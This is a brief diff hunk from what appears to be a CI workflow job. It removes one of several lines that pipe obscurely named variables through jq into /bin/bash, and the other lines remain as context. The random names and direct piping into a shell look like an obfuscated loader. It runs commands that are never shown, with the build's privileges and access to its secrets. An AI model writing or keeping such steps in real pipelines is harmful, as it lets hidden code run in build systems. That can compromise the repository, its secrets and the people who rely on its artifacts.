@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$zbafi18742" | jq -r .lubc01 | /bin/bash
           printf '%s' "$egla482" | jq -r .vnkzc082 | /bin/bash
           printf '%s' "$gpd6" | jq -r .azd8 | /bin/bash
-          printf '%s' "$vt6874" | jq -r .yirmi11 | /bin/bash
           echo $aw218 | jq -r .kdps1275 | /bin/bash
 
       - name: Upload artifact
